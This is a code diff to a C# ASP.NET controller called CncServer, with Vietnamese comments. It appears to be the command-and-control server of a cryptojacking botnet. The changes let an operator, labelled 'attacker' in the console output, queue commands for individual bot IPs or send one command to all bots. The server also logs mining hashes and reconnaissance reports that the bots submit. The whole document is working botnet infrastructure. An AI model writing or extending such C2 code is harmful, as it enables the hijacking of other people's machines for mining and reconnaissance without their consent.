@@ -25,6 +25,7 @@ namespace CncServer.Controllers
     public class SetCommandRequest
     {
         public string Command { get; set; } = string.Empty;
+        public string TargetBotIp { get; set; } = ""; // Thêm trường này: rỗng = tất cả
     }
 
     public class BotInfo
@@ -44,6 +45,7 @@ namespace CncServer.Controllers
     {
         public string Report { get; set; } = string.Empty;
     }
+
     //public class LogRequest
     //{
     //    public string BotIp { get; set; } = string.Empty;
@@ -55,8 +57,10 @@ namespace CncServer.Controllers
     public class BotController : ControllerBase
     {
         private static readonly ConcurrentDictionary<string, BotInfo> _bots = new ConcurrentDictionary<string, BotInfo>();
-        private static string _command = "idle";
+        private static string _globalCommand = "idle";
         //private static readonly ConcurrentBag<CryptoJackResult> _results = new ConcurrentBag<CryptoJackResult>();
+        // Dictionary lưu lệnh riêng cho từng Bot IP: Key = IP, Value = Command
+        private static readonly ConcurrentDictionary<string, string> _targetedCommands = new ConcurrentDictionary<string, string>();
         private static readonly object _fileLock = new object();
 
         private const string LogFolder = "log";
@@ -172,10 +176,17 @@ namespace CncServer.Controllers
             {
                 // Cập nhật last seen khi bot hỏi lệnh
                 _bots[ip].LastSeen = DateTime.UtcNow;
-                return Ok(new { command = _command });
             }
-            // Nếu bot chưa checkin mà hỏi lệnh, bắt nó checkin trước (hoặc vẫn trả lệnh default)
-            return Ok(new { command = _command });
+            // ƯU TIÊN 1: Kiểm tra xem có lệnh riêng cho bot này không
+            if (_targetedCommands.TryGetValue(ip, out string targetCmd))
+            {
+                _targetedCommands.TryRemove(ip, out _); 
+
+                return Ok(new { command = targetCmd });
+            }
+
+            // ƯU TIÊN 2: Trả về lệnh toàn cục
+            return Ok(new { command = _globalCommand });
         }
 
         // === NÂNG CẤP: Nhận một model JSON thay vì chuỗi thô ===
@@ -186,9 +197,22 @@ namespace CncServer.Controllers
             {
                 return BadRequest("Command model is invalid.");
             }
-            _command = request.Command.ToLower(); // Chuẩn hóa lệnh thành chữ thường
-            Console.WriteLine($"\n[*] New command issued by attacker: '{_command}'\n");
-            return Ok($"Command set to: {_command}");
+            string cmd = request.Command.ToLower(); // Chuẩn hóa lệnh thành chữ thường
+            // Nếu có TargetBotIp, lưu vào danh sách lệnh riêng
+            if (!string.IsNullOrWhiteSpace(request.TargetBotIp) && request.TargetBotIp != "ALL")
+            {
+                _targetedCommands[request.TargetBotIp] = cmd;
+                Console.WriteLine($"\n[*] Targeted command '{cmd}' set for Bot IP: {request.TargetBotIp}\n");
+                return Ok($"Command '{cmd}' queued for bot {request.TargetBotIp}");
+            }
+            else
+            {
+                // Nếu không có target hoặc target="ALL", đặt làm lệnh toàn cục và xóa các lệnh riêng lẻ
+                _globalCommand = cmd;
+                _targetedCommands.Clear(); // Xóa lệnh riêng để mọi bot tuân theo lệnh global
+                Console.WriteLine($"\n[*] Global command issued: '{_globalCommand}'\n");
+                return Ok($"Global command set to: {_globalCommand}");
+            }
         }
 
         [HttpGet("list")]
@@ -200,17 +224,6 @@ namespace CncServer.Controllers
         [HttpPost("submitresult")]
         public IActionResult SubmitResult([FromBody] ResultPayload payload)
         {
-            //if (result == null || string.IsNullOrEmpty(result.BotId))
-            //{
-            //    return BadRequest("Invalid result data.");
-            //}
-            //_results.Add(result);
-            //Console.ForegroundColor = ConsoleColor.Green;
-            //Console.WriteLine($"[SUCCESS] Bot {result.BotId} found a hash!");
-            //Console.WriteLine($"   -> Nonce: {result.Nonce}, Hash: {result.Hash.Substring(0, 10)}...");
-            //Console.ResetColor();
-            //return Ok("Result received.");
-            //if (result == null) return BadRequest("Invalid result data.");
             if (payload == null) return BadRequest("Invalid result data.");
 
             string ip = GetBotIp();
@@ -232,12 +245,15 @@ namespace CncServer.Controllers
             {
                 // Format log dễ parse: [Time]|IP|Nonce|Hash
                 string logFilePath = Path.Combine(LogFolder, MinedHashesFileName);
-                string logEntry = $"{result.Timestamp:O}|{result.BotIp}|{result.Nonce}|{result.Hash}";
+                string logEntry = $"{result.Timestamp:yyyy-MM-dd HH:mm:ss}|{result.BotIp}|{result.Nonce}|{result.Hash}";
 
                 lock (_fileLock)
                 {
                     System.IO.File.AppendAllText(logFilePath, logEntry + Environment.NewLine);
                 }
+                Console.ForegroundColor = ConsoleColor.DarkGray;
+                Console.WriteLine($"   -> [DISK] Saved entry to {MinedHashesFileName}");
+                Console.ResetColor();
             }
             catch (Exception ex)
             {
@@ -247,46 +263,46 @@ namespace CncServer.Controllers
             return Ok("Result received.");
         }
 
-        [HttpGet("results")]
+        //[HttpGet("results")]
+        ////public IActionResult GetResults()
+        ////{
+        ////    return Ok(_results.OrderByDescending(r => r.Timestamp));
+        ////}
         //public IActionResult GetResults()
         //{
-        //    return Ok(_results.OrderByDescending(r => r.Timestamp));
+        //    var results = new List<CryptoJackResult>();
+        //    string logFilePath = Path.Combine(LogFolder, MinedHashesFileName);
+
+        //    lock (_fileLock)
+        //    {
+        //        if (System.IO.File.Exists(logFilePath))
+        //        {
+        //            var lines = System.IO.File.ReadAllLines(logFilePath);
+        //            foreach (var line in lines)
+        //            {
+        //                try
+        //                {
+        //                    // Tách chuỗi dựa trên dấu |
+        //                    var parts = line.Split('|');
+        //                    if (parts.Length >= 4)
+        //                    {
+        //                        results.Add(new CryptoJackResult
+        //                        {
+        //                            Timestamp = DateTime.Parse(parts[0]),
+        //                            BotIp = parts[1],
+        //                            Nonce = long.Parse(parts[2]),
+        //                            Hash = parts[3]
+        //                        });
+        //                    }
+        //                }
+        //                catch { /* Bỏ qua dòng lỗi */ }
+        //            }
+        //        }
+        //    }
+
+        //    // Trả về danh sách mới nhất lên đầu
+        //    return Ok(results.OrderByDescending(r => r.Timestamp));
         //}
-        public IActionResult GetResults()
-        {
-            var results = new List<CryptoJackResult>();
-            string logFilePath = Path.Combine(LogFolder, MinedHashesFileName);
-
-            lock (_fileLock)
-            {
-                if (System.IO.File.Exists(logFilePath))
-                {
-                    var lines = System.IO.File.ReadAllLines(logFilePath);
-                    foreach (var line in lines)
-                    {
-                        try
-                        {
-                            // Tách chuỗi dựa trên dấu |
-                            var parts = line.Split('|');
-                            if (parts.Length >= 4)
-                            {
-                                results.Add(new CryptoJackResult
-                                {
-                                    Timestamp = DateTime.Parse(parts[0]),
-                                    BotIp = parts[1],
-                                    Nonce = long.Parse(parts[2]),
-                                    Hash = parts[3]
-                                });
-                            }
-                        }
-                        catch { /* Bỏ qua dòng lỗi */ }
-                    }
-                }
-            }
-
-            // Trả về danh sách mới nhất lên đầu
-            return Ok(results.OrderByDescending(r => r.Timestamp));
-        }
 
         [HttpPost("submitrecon")]
         public IActionResult SubmitRecon([FromBody] ReconPayload payload)
